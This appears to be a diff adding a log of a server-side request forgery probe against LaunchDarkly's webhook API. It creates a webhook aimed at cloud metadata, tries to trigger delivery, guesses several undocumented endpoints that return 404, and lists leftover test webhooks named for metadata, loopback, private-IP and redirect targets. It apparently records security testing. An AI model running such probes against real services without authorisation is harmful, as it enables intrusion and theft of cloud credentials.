@@ -1,0 +1,17 @@
+=== HUNT3: webhook SSRF probe ===
+[create aws-metadata] 201 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6adbb1222a1c6e0758ea6ca8","type":"application/json"}},"_id":"6adbb1222a1c6e0758ea6ca8","name"
+[+] webhook artifact id=6adbb1222a1c6e0758ea6ca8 — enabling + triggering delivery
+[enable on] 200
+[patch name -> triggers event] 200
+[records?] /api/v2/webhooks/{id}/delivery-records                     404   <!DOCTYPE html> <html lang="en">   <head>           <meta charset="utf-8">          <title>Not found</title>     <meta name="description" content="LaunchDarkly">     <meta name="viewport" content="width=device-width">      <link rel="icon" type="image/svg+xm
+[records?] /internal/webhooks/{id}/delivery-records                   404   <!DOCTYPE html> <html lang="en">   <head>           <meta charset="utf-8">          <title>Not found</title>     <meta name="description" content="LaunchDarkly">     <meta name="viewport" content="width=device-width">      <link rel="icon" type="image/svg+xm
+[records?] /api/v2/webhooks/{id}/deliveries                           404   <!DOCTYPE html> <html lang="en">   <head>           <meta charset="utf-8">          <title>Not found</title>     <meta name="description" content="LaunchDarkly">     <meta name="viewport" content="width=device-width">      <link rel="icon" type="image/svg+xm
+[records?] /internal/webhooks/{id}/deliveries                         404   <!DOCTYPE html> <html lang="en">   <head>           <meta charset="utf-8">          <title>Not found</title>     <meta name="description" content="LaunchDarkly">     <meta name="viewport" content="width=device-width">      <link rel="icon" type="image/svg+xm
+[records?] /api/v2/webhooks/{id}/summary                              404   <!DOCTYPE html> <html lang="en">   <head>           <meta charset="utf-8">          <title>Not found</title>     <meta name="description" content="LaunchDarkly">     <meta name="viewport" content="width=device-width">      <link rel="icon" type="image/svg+xm
+[records?] /internal/webhooks/{id}                                    404   <!DOCTYPE html> <html lang="en">   <head>           <meta charset="utf-8">          <title>Not found</title>     <meta name="description" content="LaunchDarkly">     <meta name="viewport" content="width=device-width">      <link rel="icon" type="image/svg+xm
+[test?] POST /api/v2/webhooks/{id}/test                       404   <!DOCTYPE html> <html lang="en">   <head>           <meta charset="utf-8">          <title>Not found</title>     <meta name="description" content="LaunchDarkly">     <meta name="viewport" content="width=device-width">      <link rel="icon" type="image/svg+xm
+[test?] POST /internal/webhooks/{id}/test                     404   <!DOCTYPE html> <html lang="en">   <head>           <meta charset="utf-8">          <title>Not found</title>     <meta name="description" content="LaunchDarkly">     <meta name="viewport" content="width=device-width">      <link rel="icon" type="image/svg+xm
+[cleanup DELETE] 204
+[verify 404] 404
+=== HUNT3 done (webhooks family integrity check) ===
+remaining webhooks in ORG account: 14 -> ['zeno-ssrf-test', 'zeno-oast-hook', 'zeno-badhost-hook', 'zeno-ssrf-W2-oast-direct', 'zeno-ssrf-W3-private-ip', 'zeno-ssrf-W4-webhooksite', 'zeno-ssrf-W5-redirect-in', 'zeno-ssrf-W5b-redirect-md', 'zeno-ssrf-W3c-localhost80', 'zeno-ssrf-W3d-loopback', 'zeno-ssrf-W3e-metadata-root', 'zeno-ssrf-W3f-mdgoog', 'zeno-ssrf-W3g-mdginternal', 'zeno-ssrf-W3h-v6metadata']
